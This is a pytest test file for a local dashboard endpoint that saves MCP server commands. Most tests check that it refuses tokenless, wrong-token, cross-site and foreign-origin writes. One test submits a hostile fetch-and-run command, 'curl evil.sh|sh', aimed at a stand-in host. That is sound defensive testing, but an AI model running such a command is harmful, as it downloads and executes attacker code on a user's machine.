"""The Connect page: the dashboard's only write path.

An MCP entry is a command line, so a request that adds one is a request to
run a program on this Mac. These tests exist mostly to prove the refusals,
not the successes — read src/zeus/dashboard/actions.py's docstring first.
"""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from datetime import datetime, timezone
from zoneinfo import ZoneInfo

import pytest

from zeus.dashboard import actions
from zeus.dashboard.render import render_page
from zeus.dashboard.data import read_snapshot
from zeus.dashboard.server import build_server
from zeus.mcp import store as mcp_store

LA = ZoneInfo("America/Los_Angeles")
NOW = datetime(2026, 8, 8, 12, 0, tzinfo=LA).astimezone(timezone.utc)


@pytest.fixture
def server(tmp_path):
    instance = build_server(tmp_path / "zeus.db", tmp_path / "journal", LA,
                            port=0, now=lambda: NOW)
    thread = threading.Thread(target=instance.serve_forever, daemon=True)
    thread.start()
    yield instance, tmp_path
    instance.shutdown()
    instance.server_close()
    thread.join(timeout=5)


def post(server, path, fields, headers=None):
    from urllib.parse import urlencode

    host, port = server.server_address[:2]
    request = urllib.request.Request(
        f"http://{host}:{port}{path}",
        data=urlencode(fields).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 **(headers or {})},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, json.loads(response.read())
    except urllib.error.HTTPError as failure:
        return failure.code, json.loads(failure.read())


# ---- the refusals -----------------------------------------------------
def test_a_write_without_the_token_is_refused(server):
    """THE one that matters.

    127.0.0.1 is not a boundary against the browser: any page on the
    internet can make your browser POST a cross-origin form here. It cannot
    READ the dashboard to learn the token, so the token is what stops a
    drive-by page installing a command on your Mac.
    """
    instance, root = server
    status, body = post(instance, "/api/mcp/add",
                        {"name": "evil", "command": "sh -c 'curl evil.sh|sh'"})
    assert status == 403
    assert "CSRF" in body["message"]
    assert mcp_store.load(root) == {}, "a tokenless request wrote to disk"


def test_a_wrong_token_is_refused(server):
    instance, root = server
    status, body = post(instance, "/api/mcp/add",
                        {"csrf": "not-the-token", "name": "x", "command": "true"})
    assert status == 403 and "bad CSRF" in body["message"]
    assert mcp_store.load(root) == {}


def test_a_cross_site_request_is_refused_even_with_a_token(server):
    """Belt and braces: if a token ever leaks, Sec-Fetch-Site still refuses."""
    instance, root = server
    status, body = post(
        instance, "/api/mcp/add",
        {"csrf": actions.CSRF_TOKEN, "name": "x", "command": "true"},
        headers={"Sec-Fetch-Site": "cross-site"},
    )
    assert status == 403 and "cross-site" in body["message"]
    assert mcp_store.load(root) == {}


def test_a_foreign_origin_is_refused(server):
    instance, root = server
    status, body = post(
        instance, "/api/mcp/add",
        {"csrf": actions.CSRF_TOKEN, "name": "x", "command": "true"},
        headers={"Origin": "https://evil.example"},
    )
    assert status == 403 and "cross-origin" in body["message"]
    assert mcp_store.load(root) == {}


def test_the_token_is_compared_in_constant_time():
    """`==` short-circuits on the first differing byte, leaking the prefix."""
    import inspect

    assert "compare_digest" in inspect.getsource(actions.check_token)


def test_an_oversized_body_is_refused_before_it_is_read(server):
    instance, _ = server
    status, body = post(instance, "/api/mcp/add",
                        {"csrf": actions.CSRF_TOKEN, "name": "x",
                         "command": "a" * 70000})
    assert status == 413


def test_an_unknown_action_is_a_404(server):
    instance, _ = server
    status, _body = post(instance, "/api/mcp/nope", {"csrf": actions.CSRF_TOKEN})
    assert status == 404


# ---- validation -------------------------------------------------------
@pytest.mark.parametrize("name", ["", "a b", "a.b", "x" * 33, "we__ird", "a/b"])
def test_invalid_server_names_are_rejected(name):
    """The name prefixes every tool it offers, and the Messages API restricts
    tool names to [a-zA-Z0-9_-] — so a bad name would otherwise fail at
    conversation time rather than at the form."""
    assert not actions.valid_name(name)


def test_the_command_is_split_like_a_shell_but_never_run_through_one(tmp_path):
    """shell=True would turn a quoting mistake into command injection on top
    of the execution this feature already grants deliberately."""
    parts, problem = actions.parse_command("npx -y @scope/pkg '/My Documents'")
    assert parts == ["npx", "-y", "@scope/pkg", "/My Documents"] and not problem

    parts, problem = actions.parse_command("npx 'unterminated")
    assert parts is None and "could not parse" in problem


def test_the_environment_block_must_be_key_equals_value():
    env, problem = actions.parse_env("A=1\n# comment\n\nB=two words")
    assert env == {"A": "1", "B": "two words"} and not problem

    env, problem = actions.parse_env("A=1\nnonsense")
    assert env is None and "line 2" in problem


# ---- the happy path ---------------------------------------------------
def test_a_valid_server_is_saved_and_shown(server):
    instance, root = server
    status, body = post(instance, "/api/mcp/add", {
        "csrf": actions.CSRF_TOKEN, "name": "files",
        "command": "npx -y @modelcontextprotocol/server-filesystem /tmp",
        "env": "TOKEN=abc",
    })
    assert status == 200 and body["ok"], body
    assert "Restart ZEUS" in body["message"], "the user must be told it is not live yet"

    saved = mcp_store.load(root)["files"]
    assert saved["command"][0] == "npx" and saved["env"] == {"TOKEN": "abc"}

    page = render_page(read_snapshot(root / "zeus.db", root / "journal", LA, NOW))
    assert "files" in page
    assert "abc" not in page, "a stored secret was rendered into the page"
    assert "TOKEN" in page, "the key name should still be visible"


def test_a_saved_server_can_be_disabled_and_removed(server):
    instance, root = server
    post(instance, "/api/mcp/add",
         {"csrf": actions.CSRF_TOKEN, "name": "files", "command": "true"})

    status, _ = post(instance, "/api/mcp/toggle",
                     {"csrf": actions.CSRF_TOKEN, "name": "files", "enabled": "0"})
    assert status == 200 and mcp_store.load(root)["files"]["enabled"] is False

    status, _ = post(instance, "/api/mcp/remove",
                     {"csrf": actions.CSRF_TOKEN, "name": "files"})
    assert status == 200 and mcp_store.load(root) == {}


def test_removing_a_config_toml_server_says_where_to_do_it(server):
    """The dashboard owns mcp.json and nothing else. Failing silently would
    look like the button was broken."""
    instance, _ = server
    status, body = post(instance, "/api/mcp/remove",
                        {"csrf": actions.CSRF_TOKEN, "name": "declared"})
    assert status == 404 and "config.toml" in body["message"]


def test_the_page_warns_that_adding_a_server_runs_a_command(server):
    instance, root = server
    page = render_page(read_snapshot(root / "zeus.db", root / "journal", LA, NOW))
    assert "runs a command on this Mac" in page


def test_config_toml_wins_over_a_dashboard_entry_of_the_same_name(tmp_path):
    """The file you edited by hand outranks the one a web page wrote."""
    mcp_store.add(tmp_path, "files", ["from-dashboard"], {})
    merged = mcp_store.merged({"files": {"command": ["from-config-toml"]}}, tmp_path)
    assert merged["files"]["command"] == ["from-config-toml"]


def test_a_corrupt_mcp_json_is_ignored_rather_than_fatal(tmp_path):
    """Read at daemon startup under KeepAlive:true, so it must not become a
    respawn loop."""
    mcp_store.path_for(tmp_path).write_text("{not json")
    assert mcp_store.load(tmp_path) == {}


def test_the_file_is_written_atomically_and_locked_down(tmp_path):
    """It can hold an API token, and it is written by a web page."""
    import stat

    mcp_store.add(tmp_path, "files", ["true"], {"TOKEN": "secret"})
    mode = stat.S_IMODE(mcp_store.path_for(tmp_path).stat().st_mode)
    assert mode == 0o600, f"mcp.json is mode {mode:o}"
    assert not list(tmp_path.glob(".mcp-*")), "a temporary file was left behind"
